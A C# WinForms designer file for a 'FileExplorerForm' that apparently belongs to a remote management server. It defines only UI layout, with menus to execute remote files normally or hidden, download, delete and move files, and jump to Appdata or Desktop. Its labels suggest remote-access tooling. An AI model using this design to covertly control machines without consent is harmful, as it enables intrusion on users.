namespace MLManagementServer.Forms
{
    partial class FileExplorerForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.lvFileView = new System.Windows.Forms.ListView();
            this.chFile = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.chSize = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.cmFileExplorer = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.executeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.normalToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.hiddenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.downloadFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.gotoSpecialFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.rootdriveListToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.apptadaToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.desktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.visualToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.showCustomIconsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.downloadFileHereToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.deleteFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.propertiesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.splitContainer1 = new System.Windows.Forms.SplitContainer();
            this.tbPath = new System.Windows.Forms.TextBox();
            this.label2 = new System.Windows.Forms.Label();
            this.label1 = new System.Windows.Forms.Label();
            this.lvFileBucket = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.cmFileBucket = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.moveHereToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.copyHereToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.renameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.removeFromBucketToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cmFileExplorer.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.splitContainer1)).BeginInit();
            this.splitContainer1.Panel1.SuspendLayout();
            this.splitContainer1.Panel2.SuspendLayout();
            this.splitContainer1.SuspendLayout();
            this.cmFileBucket.SuspendLayout();
            this.SuspendLayout();
            // 
            // lvFileView
            // 
            this.lvFileView.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.lvFileView.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.chFile,
            this.chSize});
            this.lvFileView.ContextMenuStrip = this.cmFileExplorer;
            this.lvFileView.FullRowSelect = true;
            this.lvFileView.GridLines = true;
            this.lvFileView.Location = new System.Drawing.Point(3, 25);
            this.lvFileView.MultiSelect = false;
            this.lvFileView.Name = "lvFileView";
            this.lvFileView.Size = new System.Drawing.Size(628, 198);
            this.lvFileView.TabIndex = 3;
            this.lvFileView.UseCompatibleStateImageBehavior = false;
            this.lvFileView.View = System.Windows.Forms.View.Details;
            this.lvFileView.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.lvFileView_MouseDoubleClick);
            // 
            // chFile
            // 
            this.chFile.Text = "Name";
            this.chFile.Width = 248;
            // 
            // chSize
            // 
            this.chSize.Text = "Size";
            this.chSize.Width = 194;
            // 
            // cmFileExplorer
            // 
            this.cmFileExplorer.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.executeToolStripMenuItem,
            this.downloadFileToolStripMenuItem,
            this.gotoSpecialFolderToolStripMenuItem,
            this.refreshToolStripMenuItem,
            this.visualToolStripMenuItem,
            this.copyToolStripMenuItem,
            this.downloadFileHereToolStripMenuItem,
            this.deleteFileToolStripMenuItem,
            this.propertiesToolStripMenuItem});
            this.cmFileExplorer.Name = "cmFileExplorer";
            this.cmFileExplorer.Size = new System.Drawing.Size(214, 224);
            // 
            // executeToolStripMenuItem
            // 
            this.executeToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.normalToolStripMenuItem,
            this.hiddenToolStripMenuItem});
            this.executeToolStripMenuItem.Name = "executeToolStripMenuItem";
            this.executeToolStripMenuItem.Size = new System.Drawing.Size(213, 22);
            this.executeToolStripMenuItem.Text = "Execute";
            this.executeToolStripMenuItem.Click += new System.EventHandler(this.executeToolStripMenuItem_Click);
            // 
            // normalToolStripMenuItem
            // 
            this.normalToolStripMenuItem.Name = "normalToolStripMenuItem";
            this.normalToolStripMenuItem.Size = new System.Drawing.Size(114, 22);
            this.normalToolStripMenuItem.Text = "Normal";
            this.normalToolStripMenuItem.Click += new System.EventHandler(this.normalToolStripMenuItem_Click);
            // 
            // hiddenToolStripMenuItem
            // 
            this.hiddenToolStripMenuItem.Name = "hiddenToolStripMenuItem";
            this.hiddenToolStripMenuItem.Size = new System.Drawing.Size(114, 22);
            this.hiddenToolStripMenuItem.Text = "Hidden";
            this.hiddenToolStripMenuItem.Click += new System.EventHandler(this.hiddenToolStripMenuItem_Click);
            // 
            // downloadFileToolStripMenuItem
            // 
            this.downloadFileToolStripMenuItem.Name = "downloadFileToolStripMenuItem";
            this.downloadFileToolStripMenuItem.Size = new System.Drawing.Size(213, 22);
            this.downloadFileToolStripMenuItem.Text = "Download File (10 kb max)";
            this.downloadFileToolStripMenuItem.Click += new System.EventHandler(this.downloadFileToolStripMenuItem_Click);
            // 
            // gotoSpecialFolderToolStripMenuItem
            // 
            this.gotoSpecialFolderToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.rootdriveListToolStripMenuItem,
            this.apptadaToolStripMenuItem,
            this.desktopToolStripMenuItem});
            this.gotoSpecialFolderToolStripMenuItem.Name = "gotoSpecialFolderToolStripMenuItem";
            this.gotoSpecialFolderToolStripMenuItem.Size = new System.Drawing.Size(213, 22);
            this.gotoSpecialFolderToolStripMenuItem.Text = "Goto Special Folder";
            // 
            // rootdriveListToolStripMenuItem
            // 
            this.rootdriveListToolStripMenuItem.Name = "rootdriveListToolStripMenuItem";
            this.rootdriveListToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.rootdriveListToolStripMenuItem.Text = "Root (drive list)";
            this.rootdriveListToolStripMenuItem.Click += new System.EventHandler(this.rootdriveListToolStripMenuItem_Click);
            // 
            // apptadaToolStripMenuItem
            // 
            this.apptadaToolStripMenuItem.Name = "apptadaToolStripMenuItem";
            this.apptadaToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.apptadaToolStripMenuItem.Text = "Appdata";
            this.apptadaToolStripMenuItem.Click += new System.EventHandler(this.apptadaToolStripMenuItem_Click);
            // 
            // desktopToolStripMenuItem
            // 
            this.desktopToolStripMenuItem.Name = "desktopToolStripMenuItem";
            this.desktopToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
            this.desktopToolStripMenuItem.Text = "Desktop";
            this.desktopToolStripMenuItem.Click += new System.EventHandler(this.desktopToolStripMenuItem_Click);
            // 
            // refreshToolStripMenuItem
            // 
            this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
            this.refreshToolStripMenuItem.Size = new System.Drawing.Size(213, 22);
            this.refreshToolStripMenuItem.Text = "Refresh";
            this.refreshToolStripMenuItem.Click += new System.EventHandler(this.refreshToolStripMenuItem_Click);
            // 
            // visualToolStripMenuItem
            // 
            this.visualToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.showCustomIconsToolStripMenuItem});
            this.visualToolStripMenuItem.Name = "visualToolStripMenuItem";
            this.visualToolStripMenuItem.Size = new System.Drawing.Size(213, 22);
            this.visualToolStripMenuItem.Text = "Visual";
            // 
            // showCustomIconsToolStripMenuItem
            // 
            this.showCustomIconsToolStripMenuItem.CheckOnClick = true;
            this.showCustomIconsToolStripMenuItem.Name = "showCustomIconsToolStripMenuItem";
            this.showCustomIconsToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
            this.showCustomIconsToolStripMenuItem.Text = "Show custom icons";
            this.showCustomIconsToolStripMenuItem.Click += new System.EventHandler(this.showCustomIconsToolStripMenuItem_Click);
            // 
            // copyToolStripMenuItem
            // 
            this.copyToolStripMenuItem.Name = "copyToolStripMenuItem";
            this.copyToolStripMenuItem.Size = new System.Drawing.Size(213, 22);
            this.copyToolStripMenuItem.Text = "Add To FileBucket";
            this.copyToolStripMenuItem.Click += new System.EventHandler(this.copyToolStripMenuItem_Click);
            // 
            // downloadFileHereToolStripMenuItem
            // 
            this.downloadFileHereToolStripMenuItem.Name = "downloadFileHereToolStripMenuItem";
            this.downloadFileHereToolStripMenuItem.Size = new System.Drawing.Size(213, 22);
            this.downloadFileHereToolStripMenuItem.Text = "Download File here";
            this.downloadFileHereToolStripMenuItem.Click += new System.EventHandler(this.downloadFileHereToolStripMenuItem_Click);
            // 
            // deleteFileToolStripMenuItem
            // 
            this.deleteFileToolStripMenuItem.Name = "deleteFileToolStripMenuItem";
            this.deleteFileToolStripMenuItem.Size = new System.Drawing.Size(213, 22);
            this.deleteFileToolStripMenuItem.Text = "Delete File";
            this.deleteFileToolStripMenuItem.Click += new System.EventHandler(this.deleteFileToolStripMenuItem_Click);
            // 
            // propertiesToolStripMenuItem
            // 
            this.propertiesToolStripMenuItem.Name = "propertiesToolStripMenuItem";
            this.propertiesToolStripMenuItem.Size = new System.Drawing.Size(213, 22);
            this.propertiesToolStripMenuItem.Text = "Properties";
            this.propertiesToolStripMenuItem.Click += new System.EventHandler(this.propertiesToolStripMenuItem_Click);
            // 
            // splitContainer1
            // 
            this.splitContainer1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.splitContainer1.Location = new System.Drawing.Point(0, 0);
            this.splitContainer1.Name = "splitContainer1";
            this.splitContainer1.Orientation = System.Windows.Forms.Orientation.Horizontal;
            // 
            // splitContainer1.Panel1
            // 
            this.splitContainer1.Panel1.Controls.Add(this.tbPath);
            this.splitContainer1.Panel1.Controls.Add(this.label2);
            this.splitContainer1.Panel1.Controls.Add(this.lvFileView);
            this.splitContainer1.Panel1.Paint += new System.Windows.Forms.PaintEventHandler(this.splitContainer1_Panel1_Paint);
            // 
            // splitContainer1.Panel2
            // 
            this.splitContainer1.Panel2.Controls.Add(this.label1);
            this.splitContainer1.Panel2.Controls.Add(this.lvFileBucket);
            this.splitContainer1.Size = new System.Drawing.Size(634, 309);
            this.splitContainer1.SplitterDistance = 227;
            this.splitContainer1.TabIndex = 4;
            // 
            // tbPath
            // 
            this.tbPath.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.tbPath.Location = new System.Drawing.Point(41, 4);
            this.tbPath.Name = "tbPath";
            this.tbPath.ReadOnly = true;
            this.tbPath.Size = new System.Drawing.Size(590, 20);
            this.tbPath.TabIndex = 5;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(3, 7);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(32, 13);
            this.label2.TabIndex = 4;
            this.label2.Text = "Path:";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(3, 4);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(63, 13);
            this.label1.TabIndex = 1;
            this.label1.Text = "File Bucket:";
            // 
            // lvFileBucket
            // 
            this.lvFileBucket.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.lvFileBucket.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader2,
            this.columnHeader3,
            this.columnHeader4});
            this.lvFileBucket.ContextMenuStrip = this.cmFileBucket;
            this.lvFileBucket.FullRowSelect = true;
            this.lvFileBucket.GridLines = true;
            this.lvFileBucket.Location = new System.Drawing.Point(0, 20);
            this.lvFileBucket.MultiSelect = false;
            this.lvFileBucket.Name = "lvFileBucket";
            this.lvFileBucket.Size = new System.Drawing.Size(631, 58);
            this.lvFileBucket.TabIndex = 0;
            this.lvFileBucket.UseCompatibleStateImageBehavior = false;
            this.lvFileBucket.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "File Name";
            this.columnHeader1.Width = 114;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "New Name";
            this.columnHeader2.Width = 128;
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "Remote Path";
            this.columnHeader3.Width = 157;
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "Status";
            // 
            // cmFileBucket
            // 
            this.cmFileBucket.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem1,
            this.moveHereToolStripMenuItem,
            this.copyHereToolStripMenuItem,
            this.renameToolStripMenuItem,
            this.removeFromBucketToolStripMenuItem});
            this.cmFileBucket.Name = "cmFileBucket";
            this.cmFileBucket.Size = new System.Drawing.Size(186, 114);
            // 
            // toolStripMenuItem1
            // 
            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
            this.toolStripMenuItem1.Size = new System.Drawing.Size(185, 22);
            this.toolStripMenuItem1.Text = "Move Here";
            this.toolStripMenuItem1.Click += new System.EventHandler(this.toolStripMenuItem1_Click);
            // 
            // moveHereToolStripMenuItem
            // 
            this.moveHereToolStripMenuItem.Name = "moveHereToolStripMenuItem";
            this.moveHereToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
            this.moveHereToolStripMenuItem.Text = "Move Here (Force)";
            this.moveHereToolStripMenuItem.Click += new System.EventHandler(this.moveHereToolStripMenuItem_Click);
            // 
            // copyHereToolStripMenuItem
            // 
            this.copyHereToolStripMenuItem.Name = "copyHereToolStripMenuItem";
            this.copyHereToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
            this.copyHereToolStripMenuItem.Text = "Copy Here";
            this.copyHereToolStripMenuItem.Click += new System.EventHandler(this.copyHereToolStripMenuItem_Click);
            // 
            // renameToolStripMenuItem
            // 
            this.renameToolStripMenuItem.Name = "renameToolStripMenuItem";
            this.renameToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
            this.renameToolStripMenuItem.Text = "Rename";
            this.renameToolStripMenuItem.Click += new System.EventHandler(this.renameToolStripMenuItem_Click);
            // 
            // removeFromBucketToolStripMenuItem
            // 
            this.removeFromBucketToolStripMenuItem.Name = "removeFromBucketToolStripMenuItem";
            this.removeFromBucketToolStripMenuItem.Size = new System.Drawing.Size(185, 22);
            this.removeFromBucketToolStripMenuItem.Text = "Remove from bucket";
            this.removeFromBucketToolStripMenuItem.Click += new System.EventHandler(this.removeFromBucketToolStripMenuItem_Click);
            // 
            // FileExplorerForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(634, 309);
            this.Controls.Add(this.splitContainer1);
            this.Name = "FileExplorerForm";
            this.Text = "FileExplorerForm";
            this.Load += new System.EventHandler(this.FileExplorerForm_Load);
            this.cmFileExplorer.ResumeLayout(false);
            this.splitContainer1.Panel1.ResumeLayout(false);
            this.splitContainer1.Panel1.PerformLayout();
            this.splitContainer1.Panel2.ResumeLayout(false);
            this.splitContainer1.Panel2.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.splitContainer1)).EndInit();
            this.splitContainer1.ResumeLayout(false);
            this.cmFileBucket.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        #endregion
        private System.Windows.Forms.ListView lvFileView;
        private System.Windows.Forms.ColumnHeader chFile;
        private System.Windows.Forms.ColumnHeader chSize;
        private System.Windows.Forms.ContextMenuStrip cmFileExplorer;
        private System.Windows.Forms.ToolStripMenuItem refreshToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem downloadFileToolStripMenuItem;
        private System.Windows.Forms.SplitContainer splitContainer1;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.ListView lvFileBucket;
        private System.Windows.Forms.ToolStripMenuItem copyToolStripMenuItem;
        private System.Windows.Forms.ColumnHeader columnHeader1;
        private System.Windows.Forms.ColumnHeader columnHeader2;
        private System.Windows.Forms.ColumnHeader columnHeader3;
        private System.Windows.Forms.ContextMenuStrip cmFileBucket;
        private System.Windows.Forms.ToolStripMenuItem moveHereToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem copyHereToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem renameToolStripMenuItem;
        private System.Windows.Forms.ColumnHeader columnHeader4;
        private System.Windows.Forms.ToolStripMenuItem removeFromBucketToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem1;
        private System.Windows.Forms.ToolStripMenuItem deleteFileToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem executeToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem normalToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem hiddenToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem downloadFileHereToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem propertiesToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem gotoSpecialFolderToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem apptadaToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem desktopToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem rootdriveListToolStripMenuItem;
        private System.Windows.Forms.TextBox tbPath;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.ToolStripMenuItem visualToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem showCustomIconsToolStripMenuItem;
    }
}